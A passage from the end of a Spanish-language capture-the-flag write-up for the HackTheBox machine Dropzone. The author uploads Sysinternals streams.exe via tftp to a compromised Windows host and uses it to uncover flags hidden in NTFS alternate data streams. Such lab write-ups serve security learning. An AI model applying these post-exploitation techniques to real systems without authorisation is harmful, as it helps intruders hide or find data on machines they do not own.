Descomprimimos, tomamos el binario y simplemente lo subimos al sistema:

```bash
tftp> put streams.exe /totest/streams.exe
Sent 342392 bytes in 73.4 seconds
tftp> 
```

Validamos:

```powershell
C:\totest>dir

 Volume in drive C has no label.
 Volume Serial Number is 7CF6-55F6

 Directory of C:\totest

31/05/2021  11:40     <DIR>          .
31/05/2021  11:40     <DIR>          ..
31/05/2021  11:22                 22 claro.txt
31/05/2021  11:15                 20 hola.txt
31/05/2021  11:41            342.392 streams.exe
               3 File(s)        342.434 bytes
               2 Dir(s)   7.633.166.336 bytes free

C:\totest>
```

asdfPerfectisimo, la ejecución es supersencilla, solo le debemos pasar el archivo o directorio (para esto le indicas el parámetro `-s`, así sabe que debe hacerlo recursivamente) donde buscar:

Primero aceptamos unos términos usando `-accepteula`:

```powershell
C:\totest>streams.exe -accepteula

streams v1.60 - Reveal NTFS alternate streams.
Copyright (C) 2005-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

usage: streams.exe [-s] [-d] <file or directory>
-s     Recurse subdirectories
-d     Delete streams
-nobanner
       Do not display the startup banner and copyright message.

C:\totest>
```

Y ahora si a jugar:

```powershell
C:\totest>streams.exe -s c:\totest

streams v1.60 - Reveal NTFS alternate streams.
Copyright (C) 2005-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

c:\totest\claro.txt:
         :nop.txt:$DATA 16
c:\totest\hola.txt:
       :claro.txt:$DATA 22
      :claroquesi:$DATA 0

C:\totest>
```

En nuestro directorio vemos todos los objetos ocultos que habíamos creado antes (:

Pues hagamos lo mismo pero con los archivos de **flags** a ver que:

```powershell
C:\totest>streams.exe "c:\Documents and Settings\Administrator\Desktop\root.txt"

streams v1.60 - Reveal NTFS alternate streams.
Copyright (C) 2005-2016 Mark Russinovich
Sysinternals - www.sysinternals.com


C:\totest>
```

Contra `root.txt` no detecta ningún **ADS**, veamos con el archivo que está dentro de la carpeta flags:

```powershell
C:\totest>streams.exe "c:\Documents and Settings\Administrator\Desktop\flags\2 for the price of 1!.txt"
```

![139flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/dropzone/139flags.png)

OPAAAAAAAAAAAAAAAaa, tamoooooooooooooooo melos ;) Encontramos las flags ocultas en el archivo, así que, hemos terminao por ahora.

...

Brutal máquina, la explotación inicial es una locura, me encanta como de una subida de archivos por **FTP** se puede volcar en un **RCE**, interesantísimo proceso. Y el como llegamos a las flags me encanto, primero porque no lo había usado y segundo porque es un tema superdiabólico eh jajaj, bastante llamativo para jugar con él.

Weno, espero haberme hecho entender y sobre todo espero que hayan aprendido algo nuevo, como siempre, **a seguir rompiendo todo!!** 🥰